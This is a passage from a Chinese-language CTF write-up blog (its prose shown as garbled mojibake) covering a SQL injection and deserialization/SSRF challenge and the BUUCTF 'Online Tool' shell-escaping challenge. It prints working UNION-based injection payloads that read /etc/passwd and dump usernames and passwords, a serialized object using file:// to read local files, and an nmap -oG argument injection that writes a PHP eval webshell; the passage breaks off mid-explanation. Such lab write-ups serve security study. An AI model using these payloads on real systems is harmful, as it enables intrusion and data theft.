<li><p>ä¸ºç›®å½•åï¼Œè¡¨ç¤ºä»…å…è®¸å¯¹ç‰¹å®šç›®å½•çš„æ–‡ä»¶è¿›è¡Œè¯»/å†™ã€‚</p></li>
<li><p>ä¸‰ç§æ–¹æ³•æŸ¥çœ‹å½“å‰<code>secure-file-priv</code>çš„å€¼ï¼š</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> @@secure_file_priv;
<span class="hljs-keyword">select</span> @@global.secure_file_priv;
<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;secure_file_priv&quot;</span>;</code></pre></li>
</ul>
<p>è¯»æ–‡ä»¶ï¼š</p>
<ul>
<li><p>Mysqlè¯»å–æ–‡ä»¶é€šå¸¸ä½¿ç”¨load_fileå‡½æ•°ï¼Œè¯­æ³•å¦‚ä¸‹ï¼šã€==é™åˆ¶ï¼šsecure-file-privæ— å€¼ï¼ˆrootï¼‰ã€ç»å¯¹è·¯å¾„ã€æ–‡ä»¶å¿…é¡»åœ¨æœåŠ¡å™¨ä¸Š==ã€‘</p></li>
<li><p>``` select load_file(file_path); <pre><code class="hljs sql">
- ```
  <span class="hljs-keyword">load</span> <span class="hljs-keyword">data</span> <span class="hljs-keyword">infile</span> <span class="hljs-string">&quot;/etc/passwd&quot;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">test</span> <span class="hljs-keyword">FIELDS</span> <span class="hljs-keyword">TERMINATED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;\n&#x27;</span>; <span class="hljs-comment">#è¯»å–æœåŠ¡ç«¯æ–‡ä»¶</span></code></pre></p></li>
</ul>
<pre><code class="hljs crystal">-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,@@<span class="hljs-title">secure_file_priv</span>,3,4--+    //å›æ˜¾ç©º--è¯´æ˜æ— é™åˆ¶</span>
/view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">load_file</span>(&#x27;/<span class="hljs-title">etc</span>/<span class="hljs-title">passwd</span>&#x27;),3,4--+   æˆåŠŸè¯»åˆ°ç³»ç»Ÿæ–‡ä»¶</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145336505.png" srcset="/img/loading.gif" alt="image-20220313145336505"></p>
<p>payloadï¼š==æ³¨æ„ï¼flagåœ¨æºç ==</p>
<pre><code class="hljs crystal">view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">load_file</span>(&#x27;/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">flag</span>.<span class="hljs-title">php</span>&#x27;),3,4--+</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145628120.png" srcset="/img/loading.gif" alt="image-20220313145628120"></p>
<h4 id="æ³•2ååºåˆ—åŒ–ssrfè¯»æœ¬åœ°æ–‡ä»¶">æ³•2ï¼šååºåˆ—åŒ–+SSRFè¯»æœ¬åœ°æ–‡ä»¶</h4>
<p>ç»§ç»­æ³¨å…¥ï¼Œå·²çŸ¥è¡¨æ˜¯facebook</p>
<p>çˆ†å½“å‰åº“ä¸‹æ‰€æœ‰è¡¨åï¼š</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+   é”™ï¼ï¼Œå›æ˜¾ä½ç½®åœ¨ä¸­é—´æ—¶ï¼Œfromåº”è¯¥åœ¨selectæ‰€æœ‰çš„åé¢</span>
<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+   //usersè¡¨</span></code></pre>
<p>çˆ†usersè¡¨åˆ—åï¼š</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span>
<span class="hljs-keyword">no</span>,username,passwd,data,<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></pre>
<p>çˆ†å­—æ®µï¼š</p>
<pre><code class="hljs crystal">view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">concat_ws</span>(&#x27;--&#x27;,<span class="hljs-title">no</span>,<span class="hljs-title">username</span>,<span class="hljs-title">passwd</span>,<span class="hljs-title">data</span>),3,4 <span class="hljs-title">from</span> <span class="hljs-title">users</span>--+</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313150748223.png" srcset="/img/loading.gif" alt="image-20220313150748223"></p>
<ul>
<li>ç„¶åæ³¨æ„æ³¨å…¥æ—¶ä¸€ç›´éƒ½æœ‰çš„æŠ¥é”™ï¼Œå¤§æ¦‚æ„æ€æ˜¯unserializeæ²¡æœ‰è¯»å–åˆ°å‚æ•°</li>
</ul>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151150653.png" srcset="/img/loading.gif" alt="image-20220313151150653"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151308157.png" srcset="/img/loading.gif" alt="image-20220313151308157"></p>
<ul>
<li>è¿™ä¸ªdataå°±æ˜¯åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œä¸ä¸€å¼€å§‹å¾—åˆ°çš„æºç æœ‰å…³è”äº†ï¼Œ<strong>å› ä¸ºé¡µé¢æç¤ºäº†æˆ‘ä»¬ååºåˆ—åŒ–ï¼Œæ‰€ä»¥çŒœæµ‹noå‚æ•°çš„å€¼ä»£å…¥æ•°æ®åº“æŸ¥è¯¢ä¹‹åè¿˜ä¼šè¢«ååºåˆ—åŒ–ä¸€æ¬¡ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šå¯¼è‡´blogå˜å¼‚ï¼Œè¯»ä»»æ„æ–‡ä»¶</strong></li>
</ul>
<p>å°è¯•æŠŠåºåˆ—åŒ–å­—ç¬¦ä¼ å…¥ä¸åŒä½ç½®ï¼Œå‘ç°åœ¨4çš„ä½ç½®æˆåŠŸè¯»å–åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå¹¶ååºåˆ—åŒ–è¿”å›www.baidu.comçš„base64å†…å®¹</p>
<p>æ„é€ payloadè¯»å–flag:</p>
<pre><code class="hljs css">ä¸€å¼€å§‹ï¼š
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;UserInfo&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">11</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>;&#125;
æ„é€ ï¼š
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;UserInfo&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">11</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</code></pre>
<p>æˆåŠŸè¯»åˆ°base64ï¼Œè§£ç å¾—åˆ°flag</p>
<h2 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool</h2>
<p>è€ƒç‚¹ï¼šescapeshellarg()å’Œescapeshellcmd()è¿™ä¸ªç‚¹ï¼Œå¤–åŠ ä¸€ä¸ªnmapçš„æ–‡ä»¶å†™å…¥ã€‚</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/100711933">å‚è€ƒWP1</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52907838/article/details/119115412?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=1">å‚è€ƒWP2</a></p>
</blockquote>
<p>ç‚¹è¿›å»å¾—åˆ°æºç </p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;
    $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];
&#125;
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
    $host = $_GET[<span class="hljs-string">&#x27;host&#x27;</span>];
    $host = escapeshellarg($host);  <span class="hljs-comment">//å¯¹å‚æ•°hostè¿‡æ»¤äº†</span>
    $host = escapeshellcmd($host);
    $sandbox = md5(<span class="hljs-string">&quot;glzjin&quot;</span>. $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);
&#125;</code></pre>
<p>REMOTE_ADDRä¸èƒ½ä¼ªé€ ï¼Œç„¶åè¿™é‡Œä¹Ÿä¸èƒ½äº§ç”Ÿå½±å“</p>
<p><strong>escapeshellarg</strong>æœ¬ä»¥ä¸ºæ˜¯è‡ªå®šä¹‰å‡½æ•°ï¼Œä½†å‘ç°ä¸æ˜¯ï¼Œæ˜¯å®˜æ–¹å‡½æ•°ï¼Œé˜²æ³¨å…¥çš„ï¼Œä½†å¯ä»¥ç»•è¿‡</p>
<blockquote>
<p><strong>åº”ç”¨ä½¿ç”¨</strong><code>escapeshellarg -&gt; escapeshellcmd</code><strong>è¿™æ ·çš„æµç¨‹æ¥å¤„ç†è¾“å…¥æ˜¯å­˜åœ¨éšæ‚£çš„</strong></p>
</blockquote>
<pre><code class="hljs lsl"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27; -v -d a=<span class="hljs-number">1</span>
ç»è¿‡escapeshellarg()å‡½æ•°å¤„ç†åå˜ä¸ºï¼š &#x27;<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27;\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>&#x27;
ä¹Ÿå°±æ˜¯å°†å…¶ä¸­çš„&#x27;å•å¼•å·è½¬ä¹‰ï¼Œå†å°†å·¦å³ä¸¤éƒ¨åˆ†ç”¨å•å¼•å·æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ï¼Œè¿™æ ·å·¦å³å°±å½¢æˆé—­åˆï¼Œå‘½ä»¤å°±è¢«å½“ä½œç®€å•çš„å­—ç¬¦ä¸²ã€‚

æ¥ç€ç»è¿‡escapeshellcmd()å‡½æ•°å¤„ç†åå˜æˆï¼š&#x27;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>&#x27;\\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>\&#x27;
ä¹Ÿå°±æ˜¯è¯´å¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰

æ‰§è¡Œçš„å‘½ä»¤æ˜¯curl &#x27;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>&#x27;\\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>\&#x27;ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&#x27;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„&#x27;é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>\ -v -d a=<span class="hljs-number">1</span>&#x27;ï¼Œå³å‘<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=<span class="hljs-number">1</span>&#x27;ã€‚</code></pre>
<h4 id="nampå†™webshell">nampå†™webshell</h4>
<p>å…¶ä¸­å‚æ•°<span style="background:#FF9999;"><code>-oG</code>å¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™å…¥æ–‡ä»¶ï¼Œå…¶æ ¼å¼ä¸ºï¼šå†…å®¹
-oG æ–‡ä»¶åç§°</span></p>
<pre><code class="hljs diff">Nmapçš„ä¸€äº›å‚æ•°ï¼š
<span class="hljs-deletion">-oN æ ‡å‡†ä¿å­˜</span>
<span class="hljs-deletion">-oX XMLä¿å­˜</span>
<span class="hljs-deletion">-oG Grepä¿å­˜</span>
<span class="hljs-deletion">-oA ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼</span>
<span class="hljs-deletion">-append-output è¡¥å……ä¿å­˜æ–‡ä»¶</span></code></pre>
<p>æ„é€ </p>
<pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> | <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[hack]);<span class="hljs-meta">?&gt;</span> -oG shell.php</code></pre>
<p>ä½†è¿™æ ·ä¼šè¢«escapeshellarg()ä¸escapeshellcmd()å‡½æ•°å¤„ç†ä¸ºï¼š</p>
<pre><code class="hljs taggerscript">&#x27;127.0.0.1 | <span class="hljs-symbol">\&lt;</span><span class="hljs-symbol">\?</span>php @eval<span class="hljs-symbol">\(</span><span class="hljs-symbol">\)</span><span class="hljs-symbol">\;</span><span class="hljs-symbol">\?</span><span class="hljs-symbol">\&gt;</span> -oG hack.php&#x27;</code></pre>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF-%E6%AF%94%E8%B5%9B/">CTF,æ¯”èµ›</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/05/20/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">VulnHub-Raven: 2ï¼ˆudf webshellä¸Šä¼ ææƒï¼‰</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/11/25/%E7%BD%91%E7%AB%99%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                        <span class="hidden-mobile">ç½‘ç«™æ¶æ„çŸ¥è¯†ç‚¹</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Romanc9" target="_blank" rel="nofollow noopener"><span>Luoman</span></a> <div> <span id="timeDate">è½½å…¥å¤©æ•°...</span> <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud ç»Ÿè®¡PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="leancloud-site-pv"></span>
             æ¬¡
          </span>
      
      
        <!-- LeanCloud ç»Ÿè®¡UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="leancloud-site-uv"></span>
             äºº
          </span>
      

    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>



  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>












  

  

  

  

  

  





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
